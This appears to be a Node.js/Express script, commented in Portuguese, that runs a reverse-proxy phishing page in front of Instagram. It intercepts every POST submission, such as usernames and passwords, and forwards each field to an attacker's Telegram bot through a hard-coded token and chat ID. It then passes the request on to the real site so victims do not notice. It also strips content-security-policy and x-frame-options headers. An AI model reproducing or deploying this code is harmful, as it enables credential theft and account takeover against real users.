const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');

const app = express();
const PORT = process.env.PORT || 3000;

// ================= CONFIGURAÇÕES =================
const TARGET_URL = 'https://www.instagram.com/'; // Cole a URL inteira do site alvo
const TELEGRAM_BOT_TOKEN = '8209450971:AAFt1mshdZ9xdXS8rB-263mOAUOc5Fy5XJs17:25';        // Token obtido no @BotFather
const TELEGRAM_CHAT_ID = '1004251154302';            // Seu ID numérico no Telegram
// =================================================

// Aceita diferentes formatos de envio de formulários (JSON, URL-encoded, texto)
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.text());

// Middleware para capturar os dados e garantir que o fluxo continue
app.use((req, res, next) => {
    if (req.method === 'POST') {
        let dados = req.body;

        // Se os dados vierem em formato texto/string pura, tentamos converter para objeto
        if (typeof dados === 'string' && dados.length > 0) {
            try {
                dados = JSON.parse(dados);
            } catch (e) {
                // Se não for JSON, pode ser query string serializada
                const params = new URLSearchParams(dados);
                dados = Object.fromEntries(params.entries());
            }
        }

        // Verifica se existem dados preenchidos para enviar ao Telegram
        if (dados && typeof dados === 'object' && Object.keys(dados).length > 0) {
            let mensagem = "🚨 *Novos dados capturados!*\n\n";
            for (let [chave, valor] of Object.entries(dados)) {
                // Ignora campos vazios ou internos se houverem
                if (valor !== '') {
                    mensagem += `*${chave}*: \`${valor}\`\n`;
                }
            }

            // Envia para o Telegram de forma assíncrona
            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: mensagem,
                    parse_mode: 'Markdown'
                })
            }).catch(err => console.error("Erro no envio do Telegram:", err));
        }
    }
    
    // IMPORTANTE: O next() garante que o proxy repasse a requisição para o site original, 
    // permitindo que o usuário avance para a próxima página normalmente.
    next();
});

// Proxy Reverso para o site original
app.use('/', createProxyMiddleware({
    target: TARGET_URL,
    changeOrigin: true,
    secure: false,
    followRedirects: true,
    on: {
        proxyRes: (proxyRes) => {
            delete proxyRes.headers['content-security-policy'];
            delete proxyRes.headers['x-frame-options'];
        }
    }
}));

app.listen(PORT, () => {
    console.log(`Servidor rodando com sucesso na porta ${PORT}`);
});

div.html-div {
    display: none !important;
}
